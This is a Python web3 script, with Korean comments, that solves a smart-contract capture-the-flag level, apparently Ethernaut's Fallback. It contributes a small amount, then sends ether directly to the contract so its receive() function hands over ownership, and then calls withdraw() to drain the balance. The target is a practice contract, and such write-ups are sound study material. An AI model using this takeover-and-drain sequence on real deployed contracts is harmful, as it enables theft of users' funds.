from web3 import Web3
from dotenv import dotenv_values
import requests
import json

# 풀이
# 1. 트랜잭션 인스턴스 생성 후 contribute 함수에 1회 금액 송신 실시
# 2. 1번 과정 이후 트랜잭션 인스턴스 주소를 타겟으로 단순 송신 1회 추가 실시
#    => 이 과정에서 owner 변수의 정보가 트랜잭션 주소에서 사용자 주소로 변경됨
# 3. 2번 과정 성공 후 withdraw 함수 실행하여 지갑 잔액 전액 인출 실행
# 4. 페이지에서 Submit Instance 실행하여 문제 클리어 

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "receive",
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "function",
        "name": "contribute",
        "inputs": [],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0xd7bb99ba"
    },
    {
        "type": "function",
        "name": "contributions",
        "inputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x42e94c90"
    },
    {
        "type": "function",
        "name": "getContribution",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xf10fdf5c"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "withdraw",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x3ccfd60b"
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

print("----BEFORE TRANSACTION----")

BEFORE_OWNER = contract.functions.owner().call()

if BEFORE_OWNER != USER_ADDRESS:
    print("Contract's Owner is not changed!")
else:
    print("Contract's Owner is already changed!")
    exit(0)

RESULT = contract.functions.contributions(USER_ADDRESS).call()

print(f"{USER_ADDRESS}'s Contribution : {RESULT}")

RESULT = contract.functions.contributions(BEFORE_OWNER).call()

print(f"{BEFORE_OWNER}'s Contribution : {RESULT}\n")

print("1. Sending 0.0001 ether to contribute() function")

data = {
    'value': web3.to_wei(0.00000001, 'ether'),
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
    'gas': 100000,
}

tx = contract.functions.contribute().build_transaction(data)

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print("2. Sending transaction to receive() function")

data = {
    "from": USER_ADDRESS,
    "to": CONTRACT_ADDRESS,
    "value": 1,
    'gasPrice': web3.eth.gas_price,
    "gas": 100000,
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS)
}

signed_tx = web3.eth.account.sign_transaction(data, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print("----AFTER TRANSACTION---")

RESULT = contract.functions.getContribution().call()

print(f"{USER_ADDRESS}'s Contribution : {RESULT}")

RESULT = contract.functions.contributions(BEFORE_OWNER).call()

print(f"{BEFORE_OWNER}'s Contribution : {RESULT}")

# 소유주 변경 확인
AFTER_OWNER = contract.functions.owner().call()

if AFTER_OWNER != USER_ADDRESS:
    print("Contract's Owner has not changed!\n")
    exit(0)
else:
    print("Contract's Owner has changed!\n")

print("Withdraw Contract's balance")

# 잔액 인출
tx = contract.functions.withdraw().build_transaction({
    'from' : USER_ADDRESS,
    'nonce' : web3.eth.get_transaction_count(USER_ADDRESS),
})

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

